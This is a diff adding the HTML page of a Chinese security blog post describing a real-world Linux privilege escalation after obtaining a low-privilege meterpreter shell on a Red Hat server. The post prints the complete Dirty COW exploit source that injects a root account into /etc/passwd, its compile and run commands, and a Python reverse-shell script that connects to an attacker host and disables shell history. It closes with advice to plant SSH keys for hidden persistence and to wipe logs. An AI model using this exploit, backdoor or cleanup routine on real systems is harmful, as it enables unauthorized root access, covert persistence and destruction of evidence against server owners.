@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="一次linux过程记录，没什么技巧，dirty cow直接打就行了."/>
+
+
+
+
+  <meta name="keywords" content="Hexo, Blog" />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Bypass.World">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="http://yoursite.com/2017/05/记一次linux提权/"/>
+
+
+<meta name="description" content="一次linux过程记录，没什么技巧，dirty cow直接打就行了.">
+<meta name="keywords" content="Hexo, Blog">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次linux提权">
+<meta property="og:url" content="http://yoursite.com/2017/05/记一次linux提权/index.html">
+<meta property="og:site_name" content="Bypass.World">
+<meta property="og:description" content="一次linux过程记录，没什么技巧，dirty cow直接打就行了.">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2017-09-19T17:19:57.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记一次linux提权">
+<meta name="twitter:description" content="一次linux过程记录，没什么技巧，dirty cow直接打就行了.">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?686eedfda259ce1d887831c94f49f99f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  <script type="text/javascript">
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-106734017-1', 'auto');
+        ga('send', 'pageview');
+  </script>
+
+
+
+    <title> 记一次linux提权 - Bypass.World </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Bypass.World</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          记一次linux提权
+        
+      </h1>
+
+      <time class="post-time">
+          May 18 2017
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>某次通过一个应用的通用型漏洞拿到一个Redhat的meterpreter shell.不过权限很低。因为要拿到服务器权限，首先想到了<code>dirty cow</code>提权。</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h4 id="1、一般思路"><a href="#1、一般思路" class="headerlink" title="1、一般思路"></a>1、一般思路</h4><p>一般拿到一个低权限shell，我首先都会翻一遍<code>系统信息</code>、<code>敏感配置文件</code>、<code>内网开放的端口</code>、<code>进程</code>、<code>WEB服务</code>、<code>数据库服务</code> 等信息。因为经常可以看到一些应用或者服务存在漏洞能直接拥有root权限，这要比利用系统漏洞直接提权安全、隐蔽的多。显然这次目标权限限制的比较死，这些路很难走通，那只能想办法直接提linux权限了。</p>
+<h4 id="2、Dirty-cow"><a href="#2、Dirty-cow" class="headerlink" title="2、Dirty cow"></a>2、Dirty cow</h4><p>直接提的话就祭出dirty cow咯，不管什么方法，把这个.c上传到服务器上，什么curl、wget之类的，提权文件如下：(PS:也可以参考我之前总结的一篇: <a href="https://bypass.world/2017/04/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%86%85%E4%B8%8B%E8%BD%BD%E6%80%BB%E7%BB%93/" target="_blank" rel="external">命令行内下载总结</a>)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// This exploit uses the pokemon exploit as a base and automatically</span></div><div class="line"><span class="comment">// generates a new passwd line. The original /etc/passwd is then</span></div><div class="line"><span class="comment">// backed up to /tmp/passwd.bak and overwritten with the new line.</span></div><div class="line"><span class="comment">// The user will be prompted for the new password when the binary is run.</span></div><div class="line"><span class="comment">// After running the exploit you should be able to login with the newly</span></div><div class="line"><span class="comment">// created user.</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Original exploit:</span></div><div class="line"><span class="comment">// https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// To use this exploit modify the user values according to your needs</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Compile with</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// gcc -pthread dirty.c -o dirty -lcrypt</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// and just run the newly create binary with ./dirty</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT !</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Exploit adopted by Christian "FireFart" Mehlmauer</span></div><div class="line"><span class="comment">// https://firefart.at</span></div><div class="line"><span class="comment">//</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;crypt.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> *filename = <span class="string">"/etc/passwd"</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> *backup_filename = <span class="string">"/tmp/passwd.bak"</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> *salt = <span class="string">"firefart"</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> f;</div><div class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</div><div class="line"><span class="keyword">pid_t</span> pid;</div><div class="line"><span class="keyword">pthread_t</span> pth;</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> &#123;</span></div><div class="line">   <span class="keyword">char</span> *username;</div><div class="line">   <span class="keyword">char</span> *hash;</div><div class="line">   <span class="keyword">int</span> user_id;</div><div class="line">   <span class="keyword">int</span> group_id;</div><div class="line">   <span class="keyword">char</span> *info;</div><div class="line">   <span class="keyword">char</span> *home_dir;</div><div class="line">   <span class="keyword">char</span> *shell;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">char</span> *<span class="title">generate_password_hash</span><span class="params">(<span class="keyword">char</span> *plaintext_pw)</span> </span>&#123;</div><div class="line">  <span class="keyword">return</span> crypt(plaintext_pw, salt);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">char</span> *<span class="title">generate_passwd_line</span><span class="params">(struct Userinfo u)</span> </span>&#123;</div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *format = <span class="string">"%s:%s:%d:%d:%s:%s:%s\n"</span>;</div><div class="line">  <span class="keyword">int</span> size = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, format, u.username, u.hash,</div><div class="line">    u.user_id, u.group_id, u.info, u.home_dir, u.shell);</div><div class="line">  <span class="keyword">char</span> *ret = <span class="built_in">malloc</span>(size + <span class="number">1</span>);</div><div class="line">  <span class="built_in">sprintf</span>(ret, format, u.username, u.hash, u.user_id,</div><div class="line">    u.group_id, u.info, u.home_dir, u.shell);</div><div class="line">  <span class="keyword">return</span> ret;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</div><div class="line">  <span class="keyword">int</span> i, c = <span class="number">0</span>;</div><div class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</div><div class="line">    c += madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED);</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"madvise %d\n\n"</span>, c);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *from, <span class="keyword">const</span> <span class="keyword">char</span> *to)</span> </span>&#123;</div><div class="line">  <span class="comment">// check if target file already exists</span></div><div class="line">  <span class="keyword">if</span>(access(to, F_OK) != <span class="number">-1</span>) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"File %s already exists! Please delete it and run again\n"</span>,</div><div class="line">      to);</div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">char</span> ch;</div><div class="line">  FILE *source, *target;</div><div class="line"></div><div class="line">  source = fopen(from, <span class="string">"r"</span>);</div><div class="line">  <span class="keyword">if</span>(source == <span class="literal">NULL</span>) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">  &#125;</div><div class="line">  target = fopen(to, <span class="string">"w"</span>);</div><div class="line">  <span class="keyword">if</span>(target == <span class="literal">NULL</span>) &#123;</div><div class="line">     fclose(source);</div><div class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">while</span>((ch = fgetc(source)) != EOF) &#123;</div><div class="line">     fputc(ch, target);</div><div class="line">   &#125;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"%s successfully backed up to %s\n"</span>,</div><div class="line">    from, to);</div><div class="line"></div><div class="line">  fclose(source);</div><div class="line">  fclose(target);</div><div class="line"></div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="comment">// backup file</span></div><div class="line">  <span class="keyword">int</span> ret = copy_file(filename, backup_filename);</div><div class="line">  <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</div><div class="line">    <span class="built_in">exit</span>(ret);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">user</span>;</span></div><div class="line">  <span class="comment">// set values, change as needed</span></div><div class="line">  user.username = <span class="string">"firefart"</span>;</div><div class="line">  user.user_id = <span class="number">0</span>;</div><div class="line">  user.group_id = <span class="number">0</span>;</div><div class="line">  user.info = <span class="string">"pwned"</span>;</div><div class="line">  user.home_dir = <span class="string">"/root"</span>;</div><div class="line">  user.shell = <span class="string">"/bin/bash"</span>;</div><div class="line"></div><div class="line">  <span class="keyword">char</span> *plaintext_pw = getpass(<span class="string">"Please enter new password: "</span>);</div><div class="line">  user.hash = generate_password_hash(plaintext_pw);</div><div class="line">  <span class="keyword">char</span> *complete_passwd_line = generate_passwd_line(user);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Complete line:\n%s\n"</span>, complete_passwd_line);</div><div class="line"></div><div class="line">  f = open(filename, O_RDONLY);</div><div class="line">  fstat(f, &amp;st);</div><div class="line">  <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>,</div><div class="line">             st.st_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>),</div><div class="line">             PROT_READ,</div><div class="line">             MAP_PRIVATE,</div><div class="line">             f,</div><div class="line">             <span class="number">0</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"mmap: %lx\n"</span>,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="built_in">map</span>);</div><div class="line">  pid = fork();</div><div class="line">  <span class="keyword">if</span>(pid) &#123;</div><div class="line">    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</div><div class="line">    <span class="keyword">int</span> u, i, o, c = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> l=<span class="built_in">strlen</span>(complete_passwd_line);</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10000</span>/l; i++) &#123;</div><div class="line">      <span class="keyword">for</span>(o = <span class="number">0</span>; o &lt; l; o++) &#123;</div><div class="line">        <span class="keyword">for</span>(u = <span class="number">0</span>; u &lt; <span class="number">10000</span>; u++) &#123;</div><div class="line">          c += ptrace(PTRACE_POKETEXT,</div><div class="line">                      pid,</div><div class="line">                      <span class="built_in">map</span> + o,</div><div class="line">                      *((<span class="keyword">long</span>*)(complete_passwd_line + o)));</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"ptrace %d\n"</span>,c);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    pthread_create(&amp;pth,</div><div class="line">                   <span class="literal">NULL</span>,</div><div class="line">                   madviseThread,</div><div class="line">                   <span class="literal">NULL</span>);</div><div class="line">    ptrace(PTRACE_TRACEME);</div><div class="line">    kill(getpid(), SIGSTOP);</div><div class="line">    pthread_join(pth,<span class="literal">NULL</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Done! Check %s to see if the new user was created\n"</span>, filename);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"You can log in with username %s and password %s.\n\n"</span>,</div><div class="line">    user.username, plaintext_pw);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\nDON'T FORGET TO RESTORE %s FROM %s !!!\n\n"</span>,</div><div class="line">    filename, backup_filename);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>当然上传到可写目录如<code>/tmp/1.c</code><br>接下来就是编译执行了：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#gcc编译的时候加上参数，另外如果目标没有gcc,可以编译完再上传.</span></div><div class="line">gcc -pthread dirty.c -o dirty -lcrypt</div><div class="line">./dirty</div></pre></td></tr></table></figure></p>
+<p>执行编译后的<code>dirty</code>，会将<code>/etc/passwd</code>备份到<code>/tmp/passwd.bak</code>,如果提权失败可以用来恢复。<br>输入新密码后，一顿操作，提权成功。这时候我们在低权限shell里执行<code>su firefart</code>,输入刚刚的密码就是root权限了。</p>
+<h4 id="3、Tips"><a href="#3、Tips" class="headerlink" title="3、Tips"></a>3、Tips</h4><p>当然如果你直接和之前我提到的步骤一样走的话可能会遇到一个问题，那就是无论meterpreter还是nc之类反弹出来的那一步都只是一个简单的命令执行接口，要想执行<code>su root</code>之类的命令需要在标准的<code>tty</code>下执行。这时候你需要反弹出一个tty出来，如下python脚本可以帮到我们：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> pty</div><div class="line"></div><div class="line">shell = <span class="string">"/bin/sh"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">(programname)</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"python connect-back door"</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"Usage: %s host port"</span> % programname</div><div class="line">	</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">if</span> len(sys.argv) !=<span class="number">3</span>:</div><div class="line">		usage(sys.argv[<span class="number">0</span>])</div><div class="line">		sys.exit(<span class="number">1</span>)</div><div class="line">	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		s.connect((socket.gethostbyname(sys.argv[<span class="number">1</span>]),int(sys.argv[<span class="number">2</span>])))</div><div class="line">		<span class="keyword">print</span> <span class="string">"[+]Connect OK."</span></div><div class="line">	<span class="keyword">except</span>:</div><div class="line">		<span class="keyword">print</span> <span class="string">"[-]Can't connect"</span></div><div class="line">		sys.exit(<span class="number">2</span>)</div><div class="line">		</div><div class="line">	os.dup2(s.fileno(),<span class="number">0</span>)</div><div class="line">	os.dup2(s.fileno(),<span class="number">1</span>)</div><div class="line">	os.dup2(s.fileno(),<span class="number">2</span>)</div><div class="line">	<span class="keyword">global</span> shell</div><div class="line">	os.unsetenv(<span class="string">"HISTFILE"</span>)</div><div class="line">	os.unsetenv(<span class="string">"HISTFILESIZE"</span>)</div><div class="line">	pty.spawn(shell)</div><div class="line">	s.close()</div><div class="line">	</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure></p>
+<p>这样我们就可以方便的执行命令了。</p>
+<h4 id="4、ending"><a href="#4、ending" class="headerlink" title="4、ending"></a>4、ending</h4><p>拿到root权限之后要进行收尾工作了。<br>1、我们可以先在root下写入一个ssh公钥方便我们之后的渗透工作，最好在低权限的其他用户下也写点，以免root被人发现了。<br>2、接下来要做的就是恢复dirty cow提权之前的状况了。这时候我们添加了公钥，已经可以直接ssh登陆了，直接<code>mv /tmp/passwd.bak /etc/passwd</code>还原之前的账号即可。<br>3、清理日志呗。无论是最开始拿到低权限过程，还是提权以及之后ssh的过程留下的日志。做完这一切是不是有种庖丁解牛之后的那种<code>提刀而立，为之四顾，为之踌躇满志，善刀而藏之.</code>的感觉~~</p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/渗透/">渗透</a>
+		  
+			<a href="/tags/提权/">提权</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2017/05/Samba_RCE_CVE-2017-7494/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">Samba_RCE_CVE-2017-7494</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2017/05/Python-Tips/">
+        <span class="next-text nav-default">Python Tips</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2014 -
+    
+    2017
+    <span class="footer-author">Norman.Chew.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
